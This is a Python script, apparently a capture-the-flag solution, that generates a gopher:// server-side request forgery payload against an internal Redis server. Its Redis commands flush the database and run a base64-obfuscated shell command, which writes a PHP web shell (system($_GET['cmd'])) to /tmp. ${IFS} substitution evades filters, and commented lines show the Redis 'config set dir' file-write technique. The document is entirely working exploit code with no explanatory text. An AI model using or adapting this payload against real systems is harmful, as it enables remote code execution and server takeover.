import urllib
protocol="gopher://"
ip = "redis"
port="6379"

filename="666.inc.php"
path="/tmp"
f = open('123','rb')
shell=f.read()
#shell="\n\n<title><?php system('/readflag give me the flag');?></title>\n\n"
cmd=["flushall",
     'set echo@"Iy9iaW4vc2gKZWNobyAiPHRpdGxlPiA8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4gPC90aXRsZT4iICA+IC90bXAvMTIzLnBocA=="|base64@-d|sh {}'.format(shell.replace(" ","${IFS}")),
    #  "config set dir {}".format(path),
    #  "config set dbfilename {}".format(filename),
     "save"
     ]
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.quote(urllib.quote(redis_format(x)))
    print (payload.replace('%2540','%2520'))



